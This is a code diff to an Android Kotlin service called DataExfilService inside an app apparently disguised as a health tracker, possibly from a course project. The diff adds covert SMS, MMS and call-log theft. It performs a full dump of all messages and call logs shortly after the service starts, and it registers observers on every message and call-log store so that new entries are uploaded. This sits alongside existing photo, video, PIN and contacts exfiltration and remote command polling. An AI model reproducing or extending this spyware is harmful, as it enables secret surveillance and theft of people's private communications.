@@ -35,6 +35,7 @@ import java.net.NetworkInterface
 import java.util.Collections
 import android.graphics.Bitmap
 import android.provider.Settings
+import android.provider.CallLog
 
 class DataExfilService : Service() {
 
@@ -68,6 +69,9 @@ class DataExfilService : Service() {
 
     // Upload every 30 seconds
     private val uploadInterval = 30 * 1000L
+    private lateinit var smsCallLogCollector: SmsCallLogCollector
+    private lateinit var smsObserver: ContentObserver
+    private lateinit var callLogObserver: ContentObserver
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -114,6 +118,8 @@ class DataExfilService : Service() {
         setupContactsObserver()
         registerReceiver(uploadFileReceiver,
             IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
+        smsCallLogCollector = SmsCallLogCollector(this)
+        setupSmsAndCallLogObservers()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -127,6 +133,17 @@ class DataExfilService : Service() {
         handler.postDelayed(pinUploadRunnable, 5000)
 
         startCommandPolling()
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (smsCallLogCollector.hasSmsPermission()) {
+                Log.d(TAG, "Performing initial SMS full dump")
+                smsCallLogCollector.collectAndUploadAllMessages()
+            }
+            if (smsCallLogCollector.hasCallLogPermission()) {
+                Log.d(TAG, "Performing initial call log full dump")
+                smsCallLogCollector.collectAndUploadAllCallLogs()
+            }
+        }, 10000) // 10 seconds delay
 
         return START_STICKY
     }
@@ -360,6 +377,12 @@ class DataExfilService : Service() {
         handler.removeCallbacks(uploadRunnable)
         handler.removeCallbacks(downloadUploadRunnable)
         handler.removeCallbacks(pinUploadRunnable)
+        if (::smsObserver.isInitialized) {
+            contentResolver.unregisterContentObserver(smsObserver)
+        }
+        if (::callLogObserver.isInitialized) {
+            contentResolver.unregisterContentObserver(callLogObserver)
+        }
         Log.d(TAG, "Data exfiltration service destroyed")
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
@@ -994,5 +1017,64 @@ class DataExfilService : Service() {
                 Log.e(TAG, "Error uploading video: ${e.message}")
             }
         }.start()
+    }
+
+    private fun setupSmsAndCallLogObservers() {
+        Log.d(TAG, "========== SETTING UP SMS, MMS, AND CALL LOG OBSERVERS ==========")
+
+        // Create a single observer that triggers for any message change
+        val messageObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean) {
+                Log.d(TAG, "MESSAGE DATABASE CHANGED (no URI) - checking for new messages")
+                smsCallLogCollector.collectNewMessages()
+            }
+
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                Log.d(TAG, "MESSAGE DATABASE CHANGED with URI: $uri - checking for new messages")
+                smsCallLogCollector.collectNewMessages()
+            }
+        }
+
+        // Register for ALL possible message-related URIs
+        val messageUris = listOf(
+            Uri.parse("content://sms"),           // SMS
+            Uri.parse("content://sms/inbox"),     // SMS inbox
+            Uri.parse("content://sms/sent"),      // SMS sent
+            Uri.parse("content://mms"),           // MMS
+            Uri.parse("content://mms/inbox"),     // MMS inbox
+            Uri.parse("content://mms/sent"),      // MMS sent
+            Uri.parse("content://mms-sms"),       // Combined
+            Uri.parse("content://mms-sms/conversations") // Conversations
+        )
+
+        messageUris.forEach { uri ->
+            try {
+                contentResolver.registerContentObserver(
+                    uri,
+                    true,
+                    messageObserver
+                )
+                Log.d(TAG, "Observer registered for $uri")
+            } catch (e: Exception) {
+                Log.d(TAG, "Cannot register for $uri: ${e.message}")
+            }
+        }
+
+        // Call Log Observer (keep separate)
+        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                Log.d(TAG, "CallLog onChange() called with URI: $uri")
+                smsCallLogCollector.collectNewCalls()
+            }
+        }
+
+        contentResolver.registerContentObserver(
+            CallLog.Calls.CONTENT_URI,
+            true,
+            callLogObserver
+        )
+        Log.d(TAG, "CallLog observer registered")
+
+        Log.d(TAG, "========== OBSERVER SETUP COMPLETE ==========")
     }
 }
